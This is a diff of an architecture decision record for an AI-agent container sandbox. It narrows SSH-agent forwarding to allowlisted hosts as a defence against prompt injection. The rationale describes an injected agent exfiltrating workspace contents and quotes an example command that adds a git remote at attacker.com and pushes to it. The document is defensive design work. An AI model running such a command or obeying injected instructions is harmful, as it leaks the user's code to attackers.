@@ -18,11 +18,13 @@ ADR-014 D1 was the right call for a containment cage. It is the wrong call for a
 
 ## Decisions
 
-### D1: SSH-agent forwarding is on by default
+### D1: SSH-agent forwarding is on by default, scoped via network allowlist
 
 **Firmness: FIRM**
 
-`rc up` forwards the host `ssh-agent` socket into the container by default. The agent inside the cage can use the host's SSH keys to authenticate git pushes, `gh` write operations, and other SSH-based flows, exactly as a human on the host would.
+**Evolved 2026-05-27 per [ADR-024](ADR-024-prompt-injection-threat-model.md).** The pre-evolution decision left "session-long push capability if container is compromised" as accepted risk under the "agent not adversarial" framing. Under ADR-024 D1's prompt-injection threat class, an injection-affected agent with ssh-agent forwarding can mirror workspace contents to any attacker-controlled host the user's keys reach — a load-bearing exfil channel. Per ADR-012 D8 (evolved), TCP 22 connections to hosts NOT in `network.allowed_hosts` are now refused at the network layer. ssh-agent forwarding stays on by default; its destination scope is constrained by the network allowlist.
+
+**Current decision:** `rc up` forwards the host `ssh-agent` socket into the container by default. The agent inside the cage can use the host's SSH keys to authenticate git pushes, `gh` write operations, and other SSH-based flows — for destinations on the network allowlist (`network.allowed_hosts` per ADR-012 D1 evolved). TCP-22 connections to non-whitelisted hosts are refused at the network layer (ADR-012 D8 evolved) BEFORE ssh-agent forwarding is consulted; ssh-agent-filter (ADR-022 D1 + D3) continues to operate unchanged at the credential layer for forwarded connections that pass the network check.
 
 Specifically:
 
@@ -35,7 +37,9 @@ Specifically:
 
 **Rationale:** ssh-agent forwarding is strictly better than mounting `~/.ssh` — the agent inside the cage can *use* keys but cannot *exfiltrate* them. Private keys never cross the container boundary. When the container dies, access dies. This is the standard model for CI runners and dev containers, and it matches the project's 80/20 posture: block accidents, preserve autonomy.
 
-The blast radius is real and accepted: an agent compromised inside the cage can, during its session, push to any repo the human can push to. That is consistent with rip-cage's framing (layers, not walls). DCG, compound blocker, egress denylist, and filesystem sandbox remain the primary containment mechanisms; push capability is not what those layers exist to stop.
+Under ADR-024 D1's prompt-injection threat class, the destination-scope evolution closes a load-bearing exfil channel that the pre-evolution decision had left open: an injection-affected agent that constructs `git remote add evil-mirror git@attacker.com:repo` and pushes is refused at TCP-connect to attacker.com:22 (ADR-012 D8 evolved). Legitimate git workflows are unaffected — github/gitlab/codeberg/etc. are in the default whitelist baseline. Single config surface (`network.allowed_hosts`) governs both HTTP egress AND ssh port-22 destinations; two enforcement layers (network proxy for HTTP, iptables for ssh) compose internally.
+
+The pre-evolution residual risk ("session-long push capability if container is compromised") is now narrowed to whitelisted hosts only. DCG, compound blocker, egress whitelist (ADR-012 D1 evolved), and filesystem sandbox remain the primary containment mechanisms; the destination-scope evolution adds a new layer addressing the ssh-side of the exfil axis from ADR-024 D2.
 
 **Alternatives considered:**
 
